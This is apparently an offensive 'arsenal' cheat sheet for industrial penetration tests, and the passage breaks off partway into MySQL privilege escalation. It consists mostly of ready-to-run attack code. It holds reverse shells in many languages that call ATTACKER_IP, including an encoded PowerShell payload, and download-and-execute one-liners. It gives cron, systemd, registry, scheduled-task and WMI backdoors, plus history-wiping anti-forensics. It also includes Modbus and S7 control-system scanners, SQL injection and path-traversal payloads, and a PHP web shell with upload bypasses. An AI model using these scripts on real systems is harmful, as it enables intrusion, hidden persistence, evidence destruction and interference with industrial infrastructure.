# Tactical Scripts & Automation Arsenal

**Authored by: Hex**
**Version: 2.0 - Industrial Operations Toolkit**
**Classification:** Internal Use Only
**Last Updated:** [TIMESTAMP]

---

## Executive Summary

Time is our most precious resource during operations. This comprehensive arsenal contains battle-tested, production-ready scripts for every phase of an industrial penetration test. From initial reconnaissance to post-exploitation persistence, these tools form the backbone of efficient operations.

**Mission Critical:** Every script has been tested in real-world scenarios. Copy, paste, execute, and adapt as needed. Speed and reliability are paramount.

---

## Table of Contents

1. [Quick Reference & Cheat Sheets](#quick-reference--cheat-sheets)
2. [Network Discovery & Enumeration](#network-discovery--enumeration)
3. [Reverse Shells & Command Execution](#reverse-shells--command-execution)
4. [File Transfer Methods](#file-transfer-methods)
5. [Privilege Escalation Scripts](#privilege-escalation-scripts)
6. [Persistence Mechanisms](#persistence-mechanisms)
7. [Network Pivoting & Tunneling](#network-pivoting--tunneling)
8. [Industrial Control Systems (ICS) Scripts](#industrial-control-systems-ics-scripts)
9. [Web Application Exploitation](#web-application-exploitation)
10. [Database Exploitation](#database-exploitation)
11. [Active Directory & Domain Scripts](#active-directory--domain-scripts)
12. [Stealth & Anti-Forensics](#stealth--anti-forensics)
13. [Automation & Frameworks](#automation--frameworks)
14. [Emergency Response Scripts](#emergency-response-scripts)

---

## Quick Reference & Cheat Sheets

### Essential One-Liners for Speed

```bash
# Quick port scan without nmap
for p in {21,22,23,25,53,80,110,443,993,995,1723,3389,5985,5986}; do (echo >/dev/tcp/TARGET/$p) 2>/dev/null && echo "Port $p open"; done

# Find SUID binaries
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# Search for passwords in files
grep -r -i "password" /var/log/ 2>/dev/null

# Check for interesting files
find / -name "*.conf" -o -name "*.config" -o -name "*.bak" 2>/dev/null

# Current user privileges
id; sudo -l; groups

# Network connections
netstat -tulpn 2>/dev/null | grep LISTEN
```

### Emergency Commands
```bash
# Kill all connections (emergency disconnect)
pkill -f nc; pkill -f ncat; pkill -f socat

# Clean command history
history -c; history -w; rm ~/.bash_history

# Remove uploaded files
rm -rf /tmp/*evil* /var/www/html/*shell* /dev/shm/*hack*
```

---

## Network Discovery & Enumeration

### Advanced Port Scanning

**Multi-threaded Bash Port Scanner**
```bash
#!/bin/bash
# Fast parallel port scanner
TARGET="$1"
THREADS=100

scan_port() {
    port=$1
    if (echo >/dev/tcp/$TARGET/$port) 2>/dev/null; then
        echo "Port $port: OPEN"
    fi
}

echo "Scanning $TARGET..."
for port in {1..65535}; do
    (($(jobs -r | wc -l) >= $THREADS)) && wait
    scan_port $port &
done
wait
```

**UDP Port Scanner**
```bash
#!/bin/bash
# UDP port discovery
TARGET="$1"
for port in 53 67 68 69 123 135 137 138 139 161 162 445 500 514 520 631 1434 1900 4500 5353; do
    (echo "test" > /dev/udp/$TARGET/$port) 2>/dev/null && echo "UDP $port: OPEN"
done
```

**Subnet Discovery**
```bash
#!/bin/bash
# Discover live hosts in subnet
SUBNET="$1"  # e.g., 192.168.1
for i in {1..254}; do
    (ping -c 1 -W 1 $SUBNET.$i 2>/dev/null | grep "bytes from" | cut -d' ' -f4 | cut -d':' -f1 &)
done | sort -V
```

### Service Enumeration Scripts

**HTTP Service Enumeration**
```python
#!/usr/bin/env python3
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

def check_url(url):
    try:
        r = requests.get(url, timeout=5, verify=False)
        return f"{url} - {r.status_code} - {len(r.content)} bytes"
    except:
        return None

targets = ["10.10.1.1", "10.10.1.2"]  # Add your targets
paths = ["/", "/admin", "/login", "/api", "/config", "/backup"]

with ThreadPoolExecutor(max_workers=20) as executor:
    for target in targets:
        for port in [80, 443, 8080, 8443]:
            for path in paths:
                url = f"http{'s' if port in [443,8443] else ''}://{target}:{port}{path}"
                result = executor.submit(check_url, url)
                if result.result():
                    print(result.result())
```

**SMB Enumeration Script**
```bash
#!/bin/bash
# Comprehensive SMB enumeration
TARGET="$1"

echo "[+] SMB Enumeration for $TARGET"
echo "=================================="

# Check if SMB is open
if (echo >/dev/tcp/$TARGET/445) 2>/dev/null; then
    echo "[+] SMB Port 445 is open"
    
    # Anonymous shares
    echo "[+] Checking anonymous shares..."
    smbclient -L //$TARGET -N 2>/dev/null
    
    # Null session enumeration
    echo "[+] Attempting null session..."
    rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null
    
    # SMB version detection
    echo "[+] SMB Version detection..."
    nmap --script smb-protocols -p 445 $TARGET 2>/dev/null
    
else
    echo "[-] SMB Port 445 is closed"
fi
```

---

## Reverse Shells & Command Execution

### Comprehensive Reverse Shell Collection

**Linux Reverse Shells**
```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1

# Netcat Traditional
nc -e /bin/sh ATTACKER_IP PORT

# Netcat Alternative (when -e not available)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Netcat with encryption
ncat --ssl ATTACKER_IP PORT -e /bin/bash

# Socat
socat tcp-connect:ATTACKER_IP:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

**Windows Reverse Shells**
```powershell
# PowerShell TCP
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# PowerShell Base64 Encoded
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAQQBUAFQAQQBDAEsARQBSAF8ASQBQACIALABQAE8AUgBUACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

# PowerCat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1');powercat -c ATTACKER_IP -p PORT -e cmd"

# MSFVenom PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f powershell

# Nishang Invoke-PowerShellTcp
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT"
```

### Interactive Shell Upgrade

**Python TTY Upgrade**
```bash
# On target (upgrade dumb shell to TTY)
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell (Ctrl+Z), then on attacker:
stty raw -echo; fg

# Set terminal size
export TERM=xterm-256color
stty rows 38 columns 116  # adjust to your terminal size
```

**Socat Fully Interactive Shell**
```bash
# On attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

---

## File Transfer Methods

### Linux File Transfer

**HTTP Download Methods**
```bash
# wget
wget http://ATTACKER_IP:8000/file -O /tmp/file

# curl
curl http://ATTACKER_IP:8000/file -o /tmp/file

# Python
python -c "import urllib; urllib.urlretrieve('http://ATTACKER_IP:8000/file', '/tmp/file')"
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP:8000/file', '/tmp/file')"

# Bash (when curl/wget unavailable)
exec 3<>/dev/tcp/ATTACKER_IP/8000
echo -e "GET /file HTTP/1.1\nHost: ATTACKER_IP:8000\n\n" >&3
cat <&3 > /tmp/file
```

**Base64 Transfer**
```bash
# On attacker (encode file)
base64 -w 0 file.bin > file.b64

# Copy the base64 content, then on target:
echo "BASE64_CONTENT_HERE" | base64 -d > /tmp/file.bin
```

**Netcat File Transfer**
```bash
# On attacker (sender)
nc -nlvp 4444 < file_to_send

# On target (receiver)
nc ATTACKER_IP 4444 > received_file

# Reverse (target sends file)
# On target
nc -nlvp 4444 < file_to_send

# On attacker
nc TARGET_IP 4444 > received_file
```

**SCP/SFTP (when SSH available)**
```bash
# Upload to target
scp file.txt user@TARGET_IP:/tmp/

# Download from target
scp user@TARGET_IP:/path/to/file ./
```

### Windows File Transfer

**PowerShell Download Methods**
```powershell
# Invoke-WebRequest (PowerShell 3.0+)
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/file.exe" -OutFile "C:\temp\file.exe"

# System.Net.WebClient
(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file.exe", "C:\temp\file.exe")

# Start-BitsTransfer (Background transfer)
Start-BitsTransfer -Source "http://ATTACKER_IP:8000/file.exe" -Destination "C:\temp\file.exe"

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://ATTACKER_IP:8000/file.exe" -OutFile "C:\temp\file.exe"
```

**Windows Command Line Downloads**
```cmd
# certutil (Windows 7+)
certutil -urlcache -split -f "http://ATTACKER_IP:8000/file.exe" C:\temp\file.exe

# bitsadmin (Deprecated but still works)
bitsadmin /transfer job /download /priority high "http://ATTACKER_IP:8000/file.exe" "C:\temp\file.exe"
```

**SMB File Transfer**
```bash
# On attacker (create SMB share)
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /path/to/files

# On Windows target
copy \\ATTACKER_IP\share\file.exe C:\temp\file.exe
```

---

## Privilege Escalation Scripts

### Linux Privilege Escalation

**LinPEAS - Linux Privilege Escalation Awesome Script**
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or host it locally
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Linux Exploit Suggester**
```bash
# Download and run
wget http://ATTACKER_IP:8000/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh
```

**Manual Enumeration Script**
```bash
#!/bin/bash
# Quick privilege escalation enumeration

echo "=== SYSTEM INFORMATION ==="
uname -a
cat /etc/*release
cat /proc/version

echo "=== USER INFORMATION ==="
id
sudo -l
groups
cat /etc/passwd | grep -v nologin

echo "=== NETWORK INFORMATION ==="
ifconfig || ip a
netstat -antup 2>/dev/null
ss -antup 2>/dev/null

echo "=== SUID/SGID FILES ==="
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

echo "=== WRITABLE DIRECTORIES ==="
find / -writable -type d 2>/dev/null | grep -v proc

echo "=== CRON JOBS ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
crontab -l 2>/dev/null

echo "=== SERVICES ==="
ps aux | grep root
systemctl list-units --type=service 2>/dev/null

echo "=== INTERESTING FILES ==="
find / -name "*.conf" -type f 2>/dev/null | head -20
find / -name "*password*" -type f 2>/dev/null
find / -name "*secret*" -type f 2>/dev/null
```

### Windows Privilege Escalation

**WinPEAS**
```powershell
# Download and run WinPEAS
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/winPEAS.ps1')

# Or executable version
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/winPEAS.exe" -OutFile "C:\temp\winPEAS.exe"
C:\temp\winPEAS.exe
```

**PowerUp - PowerShell Privilege Escalation**
```powershell
# Download and run PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1')
Invoke-AllChecks
```

**Manual Windows Enumeration**
```powershell
# System information
systeminfo
wmic qfe list
whoami /all
net user
net localgroup administrators

# Services
wmic service list brief
sc query

# Scheduled tasks
schtasks /query /fo LIST /v
wmic process list

# Network information
ipconfig /all
netstat -ano
route print

# Files and permissions
dir C:\ /s /b | findstr /i "password config backup"
icacls "C:\Program Files"
```

---

## Persistence Mechanisms

### Linux Persistence

**Cron Job Backdoor**
```bash
# Add persistent reverse shell via cron
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'") | crontab -

# Or write directly to cron files
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" >> /etc/crontab
```

**SSH Key Persistence**
```bash
# Generate SSH key pair on attacker
ssh-keygen -t rsa -f ~/.ssh/target_key

# Add public key to target's authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAA... your_public_key" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connect from attacker
ssh -i ~/.ssh/target_key user@TARGET_IP
```

**Systemd Service Persistence**
```bash
# Create malicious service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable update.service
systemctl start update.service
```

**Init Script Persistence**
```bash
# Add to .bashrc/.profile
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &" >> ~/.bashrc

# Or system-wide
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &" >> /etc/bash.bashrc
```

### Windows Persistence

**Registry Run Keys**
```powershell
# Current user
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')\""

# All users (requires admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')\""
```

**Scheduled Task Persistence**
```powershell
# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')\"" /sc minute /mo 5 /ru SYSTEM
```

**WMI Event Subscription**
```powershell
# Create WMI event subscription for persistence
$EventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="WindowsUpdate";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}

$EventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WindowsUpdate";CommandLineTemplate="powershell -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')\""}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$EventFilter;Consumer=$EventConsumer}
```

---

## Network Pivoting & Tunneling

### SSH Tunneling

**Local Port Forwarding**
```bash
# Forward local port 8080 to target's port 80
ssh -L 8080:TARGET_IP:80 user@PIVOT_HOST

# Access via localhost:8080
```

**Remote Port Forwarding**
```bash
# Forward target's port 8080 to attacker's port 80
ssh -R 8080:localhost:80 user@ATTACKER_IP

# Target can now access attacker's services via localhost:8080
```

**Dynamic Port Forwarding (SOCKS Proxy)**
```bash
# Create SOCKS proxy on port 1080
ssh -D 1080 user@PIVOT_HOST

# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn TARGET_NETWORK
```

### Socat Tunneling

**Port Forwarding**
```bash
# Forward local port 8080 to remote service
socat TCP-LISTEN:8080,fork TCP:TARGET_IP:80
```

**Reverse Tunnel**
```bash
# On target (create reverse tunnel)
socat TCP-LISTEN:8080,fork TCP:ATTACKER_IP:80

# On attacker
socat TCP-LISTEN:80,fork TCP:127.0.0.1:8080
```

### Netcat Relays

**Port Relay**
```bash
# Simple port relay
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc TARGET_IP 80 1>backpipe
```

### Chisel Tunneling

**Reverse SOCKS Proxy**
```bash
# On attacker (server)
./chisel server -p 8000 --reverse

# On target (client)
./chisel client ATTACKER_IP:8000 R:1080:socks

# Use with proxychains
proxychains nmap -sT TARGET_NETWORK
```

---

## Industrial Control Systems (ICS) Scripts

### Modbus Protocol Scripts

**Modbus Scanner Python Script**
```python
#!/usr/bin/env python3
import socket
import struct
import sys
from time import sleep

def modbus_request(ip, port, unit_id, function_code, address, count):
    # Modbus TCP header + PDU
    transaction_id = 0x0001
    protocol_id = 0x0000
    length = 6
    
    # Build request
    request = struct.pack('>HHHBBB', transaction_id, protocol_id, length,
                         unit_id, function_code, address) + struct.pack('>H', count)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(request)
        response = sock.recv(1024)
        sock.close()
        return response
    except:
        return None

def scan_modbus_devices(ip_range, port=502):
    print(f"[+] Scanning Modbus devices on port {port}")
    for i in range(1, 255):
        ip = f"{ip_range}.{i}"
        for unit_id in range(1, 11):
            response = modbus_request(ip, port, unit_id, 3, 0, 1)  # Read holding registers
            if response and len(response) > 8:
                print(f"[+] Found Modbus device: {ip} - Unit ID: {unit_id}")
                
                # Try to read device identification
                dev_id = modbus_request(ip, port, unit_id, 43, 0, 0)  # MEI function
                if dev_id:
                    print(f"    Device ID response: {dev_id.hex()}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 modbus_scanner.py 192.168.1")
        sys.exit(1)
    
    scan_modbus_devices(sys.argv[1])
```

**Modbus Register Reader**
```python
#!/usr/bin/env python3
import socket
import struct

def read_modbus_registers(ip, port, unit_id, start_addr, count):
    transaction_id = 0x0001
    protocol_id = 0x0000
    length = 6
    function_code = 3  # Read holding registers
    
    request = struct.pack('>HHHBBBH', transaction_id, protocol_id, length,
                         unit_id, function_code, start_addr, count)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(request)
        response = sock.recv(1024)
        sock.close()
        
        if len(response) > 9:
            data_length = response[8]
            register_data = response[9:9+data_length]
            
            print(f"[+] Read {count} registers starting from {start_addr}:")
            for i in range(0, len(register_data), 2):
                if i+1 < len(register_data):
                    value = struct.unpack('>H', register_data[i:i+2])[0]
                    print(f"    Register {start_addr + i//2}: {value}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

# Example usage
read_modbus_registers("192.168.1.100", 502, 1, 40001, 10)
```

### SCADA Protocol Scripts

**S7 Communication Script**
```python
#!/usr/bin/env python3
import socket
import struct

def s7_connect(ip, port=102):
    # S7 COTP Connection Request
    cotp_cr = bytes([
        0x03, 0x00, 0x00, 0x16,  # TPKT Header
        0x11, 0xe0, 0x00, 0x00, 0x00, 0x01, 0x00, 0xc1, 0x02, 0x01, 0x00,
        0xc2, 0x02, 0x01, 0x02, 0xc0, 0x01, 0x09
    ])
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.send(cotp_cr)
        response = sock.recv(1024)
        
        if len(response) > 0:
            print(f"[+] S7 device found at {ip}:102")
            
            # S7 Setup Communication
            s7_setup = bytes([
                0x03, 0x00, 0x00, 0x19,  # TPKT
                0x02, 0xf0, 0x80,        # COTP
                0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00,
                0x00, 0xf0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xe0
            ])
            sock.send(s7_setup)
            response = sock.recv(1024)
            print(f"    Setup response: {response.hex()}")
            
        sock.close()
        
    except Exception as e:
        print(f"[-] Error connecting to {ip}: {e}")

# Scan range
for i in range(1, 255):
    s7_connect(f"192.168.1.{i}")
```

---

## Web Application Exploitation

### SQL Injection Scripts

**Automated SQLi Testing**
```python
#!/usr/bin/env python3
import requests
import urllib.parse
import sys

def test_sql_injection(url, param, payloads):
    print(f"[+] Testing SQL injection on {url} parameter: {param}")
    
    for payload in payloads:
        data = {param: payload}
        
        try:
            response = requests.post(url, data=data, timeout=10)
            
            # Check for SQL error indicators
            sql_errors = [
                "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                "sqlite3", "Microsoft OLE DB", "ODBC", "SQLServer"
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"[!] Potential SQLi found with payload: {payload}")
                    print(f"    Response length: {len(response.text)}")
                    return True
                    
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")
    
    return False

# Common SQL injection payloads
sqli_payloads = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "' AND (SELECT COUNT(*) FROM sysobjects)>0--"
]

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 sqli_tester.py <URL> <parameter>")
        sys.exit(1)
    
    test_sql_injection(sys.argv[1], sys.argv[2], sqli_payloads)
```

**SQLMap Automation Script**
```bash
#!/bin/bash
# Automated SQLMap testing

URL="$1"
COOKIE="$2"

if [ -z "$URL" ]; then
    echo "Usage: $0 <URL> [COOKIE]"
    exit 1
fi

echo "[+] Starting SQLMap automation for: $URL"

# Basic injection test
if [ -n "$COOKIE" ]; then
    sqlmap -u "$URL" --cookie="$COOKIE" --batch --level=3 --risk=2
else
    sqlmap -u "$URL" --batch --level=3 --risk=2
fi

# If injection found, extract data
if [ $? -eq 0 ]; then
    echo "[+] Injection confirmed! Extracting databases..."
    sqlmap -u "$URL" --cookie="$COOKIE" --dbs --batch
    
    echo "[+] Extracting tables..."
    sqlmap -u "$URL" --cookie="$COOKIE" --tables --batch
    
    echo "[+] Dumping interesting tables..."
    sqlmap -u "$URL" --cookie="$COOKIE" --dump -T users --batch
fi
```

### Directory Traversal Scripts

**Path Traversal Tester**
```python
#!/usr/bin/env python3
import requests
import urllib.parse

def test_path_traversal(base_url, param_name):
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\/....\/....\/etc/passwd",
        "../" * 10 + "etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ]
    
    for payload in payloads:
        url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
        
        try:
            response = requests.get(url, timeout=10)
            
            if "root:" in response.text or "administrator" in response.text.lower():
                print(f"[!] Path traversal found: {payload}")
                print(f"    Response preview: {response.text[:200]}...")
                return True
                
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")
    
    return False
```

### File Upload Exploitation

**Web Shell Upload Script**
```php
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<form>
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

**Upload Bypass Techniques**
```python
#!/usr/bin/env python3
import requests

def test_upload_bypass(upload_url, shell_content):
    # Different file extensions to try
    extensions = [
        ".php", ".php3", ".php4", ".php5", ".phtml",
        ".asp", ".aspx", ".jsp", ".jspx"
    ]
    
    # Different content-type bypasses
    content_types = [
        "image/jpeg", "image/png", "image/gif",
        "text/plain", "application/octet-stream"
    ]
    
    for ext in extensions:
        for content_type in content_types:
            filename = f"shell{ext}"
            
            files = {
                'file': (filename, shell_content, content_type)
            }
            
            try:
                response = requests.post(upload_url, files=files)
                
                if "success" in response.text.lower() or response.status_code == 200:
                    print(f"[+] Upload successful: {filename} with {content_type}")
                    
            except Exception as e:
                print(f"[-] Error uploading {filename}: {e}")
```

---

## Database Exploitation

### MySQL Exploitation

**MySQL Enumeration Script**
```python
#!/usr/bin/env python3
import mysql.connector
import sys

def mysql_enum(host, user, password, port=3306):
    try:
        conn = mysql.connector.connect(
            host=host,
            user=user,
            password=password,
            port=port
        )
        cursor = conn.cursor()
        
        print(f"[+] Connected to MySQL on {host}:{port}")
        
        # Version information
        cursor.execute("SELECT VERSION()")
        version = cursor.fetchone()[0]
        print(f"[+] MySQL Version: {version}")
        
        # List databases
        cursor.execute("SHOW DATABASES")
        databases = cursor.fetchall()
        print(f"[+] Databases:")
        for db in databases:
            print(f"    {db[0]}")
        
        # List users
        cursor.execute("SELECT user, host FROM mysql.user")
        users = cursor.fetchall()
        print(f"[+] Users:")
        for user in users:
            print(f"    {user[0]}@{user[1]}")
        
        # Check privileges
        cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
        grants = cursor.fetchall()
        print(f"[+] Current user privileges:")
        for grant in grants:
            print(f"    {grant[0]}")
        
        conn.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 mysql_enum.py <host> <user> <password>")
        sys.exit(1)
    
    mysql_enum(sys.argv[1], sys.argv[2], sys.argv[3])
```

**MySQL UDF Privilege Escalation**
```sql
-- Create User Defined Function for command execution
-- First, upload lib_mysqludf_sys.so to MySQL plugin directory

CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

-- Execute system commands
